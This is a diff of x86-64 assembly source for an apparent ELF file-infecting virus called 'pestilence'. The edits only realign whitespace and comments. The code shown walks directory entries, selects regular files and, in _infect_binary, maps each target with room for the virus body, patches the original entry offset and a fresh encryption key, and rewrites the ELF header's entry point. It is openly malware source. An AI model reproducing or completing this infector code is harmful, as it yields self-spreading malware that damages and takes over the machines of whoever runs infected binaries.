@@ -131,7 +131,7 @@ _parsing:
     mov     rdx,  BUFF_SIZE
     syscall
     test    rax, rax
-    jle     .close_dir ; (error or no more entries)
+    jle     .close_dir                   ; (error or no more entries)
 
     mov     r12, rax
     xor     r13, r13
@@ -146,7 +146,7 @@ _parsing:
    	mov		al,  byte [rdi + r10 - 1]   ; file type
     lea     rsi, [rdi  + 18]            ; address of d_name field
     add     r13, r10
-    cmp     al,  DT_REG                ; only process regular files
+    cmp     al,  DT_REG                 ; only process regular files
     jne     .read_entry_files
     push    r15                         ; saving directory name on stack
     call     _process_file
@@ -311,7 +311,7 @@ _infect_binary:
     js      .return_infect_binary
 
 .mmap_again:
-    mov     rsi, [rbp - FILE_SIZE]      ; file size + virus size
+    mov     rsi, [rbp - FILE_SIZE]         ; file size + virus size
     add     rsi, [rbp - VIRUS_SIZE]
 
     call    _mmap_func
@@ -386,7 +386,7 @@ _infect_binary:
 
 .patch_binary:
     mov     r14, [rbp - MAPPED_PTR]    
-    mov	    r11, qword [r14  + 0x18]     ; e_entry from header
+    mov     r11, qword [r14  + 0x18]     ; e_entry from header
 
     mov     rax, [rbp - VIRTUAL_ADDR]    ; calculating ORIGINAL_ENTRY_OFF value of pestilence.asm and patching it 
     sub     rax, r11                     ; the new value is the   virtual offset from beginning of routine (end of file) to e_entry
@@ -397,7 +397,7 @@ _infect_binary:
     mov     r8, [rbp - NEW_KEY]
     mov     rax, [rbp - VIRUS_KEY_ADDR]
     sub     rdi, rax
-    mov     qword [rdi], r8     ; offset to key in pestilence
+    mov     qword [rdi], r8              ; offset to key in pestilence
 
 ; patching entry in header
     mov     rax, [rbp - VIRTUAL_ADDR]
